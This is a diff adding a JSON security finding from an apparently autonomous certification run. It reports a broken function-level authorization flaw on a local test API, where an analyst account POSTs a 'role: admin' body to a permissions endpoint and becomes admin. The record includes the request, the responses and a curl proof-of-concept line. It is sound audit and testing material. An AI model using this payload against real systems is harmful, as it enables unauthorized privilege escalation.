@@ -1,0 +1,78 @@
+{
+  "finding_id": "F-BFLA-1790155582",
+  "certification_run_id": "RUN-E2E-001",
+  "vulnerability_class": "BFLA",
+  "target_asset": "127.0.0.1:9090",
+  "affected_endpoint": "/api/v1/users/permissions",
+  "affected_parameter": "role",
+  "preconditions": [
+    "Analyst session active"
+  ],
+  "authorization_context": {
+    "auth_type": "[REDACTED]",
+    "token": "[REDACTED]"
+  },
+  "baseline_request": {
+    "method": "GET",
+    "url": "http://127.0.0.1:9090/api/v1/users/me"
+  },
+  "test_request": {
+    "method": "POST",
+    "url": "http://127.0.0.1:9090/api/v1/users/permissions",
+    "body": {
+      "role": "admin"
+    }
+  },
+  "baseline_response": {
+    "status_code": 200,
+    "role": "analyst"
+  },
+  "changed_response": {
+    "status_code": 200,
+    "role": "admin"
+  },
+  "differential_evidence": "Analyst upgraded self to admin role without 403 authorization check.",
+  "reproduction_records": [
+    {
+      "attempt": 1,
+      "success": true
+    },
+    {
+      "attempt": 2,
+      "success": true
+    }
+  ],
+  "impact_evidence": {
+    "cvss": 8.8,
+    "severity": "HIGH",
+    "impact": "Complete privilege escalation"
+  },
+  "graph_evidence_refs": [
+    "graph_node_auth_bfla_1"
+  ],
+  "hypothesis_history": [
+    {
+      "hypothesis": "Permission mutation missing role gate"
+    }
+  ],
+  "decision_trace": [
+    {
+      "action": "P5_HTTP_EXECUTION",
+      "capability": "HTTP_REQUEST"
+    }
+  ],
+  "raw_evidence_hashes": [
+    "hash_raw_01"
+  ],
+  "poc_reference": "curl -X POST http://127.0.0.1:9090/api/v1/users/permissions -d '{\"role\": \"admin\"}'",
+  "timestamps": {
+    "discovered_at": "2026-09-23T09:26:22Z",
+    "packaged_at": "2026-09-23T09:26:22Z"
+  },
+  "scope_proof": {
+    "in_scope": true,
+    "target": "127.0.0.1:9090"
+  },
+  "discovery_source": "AUTONOMOUS",
+  "redacted_summary": "Vulnerability: BFLA on /api/v1/users/permissions. Parameter: role. Preconditions: 1. Reproductions: 2. Attribution: AUTONOMOUS. Sensitive credentials: [REDACTED]."
+}
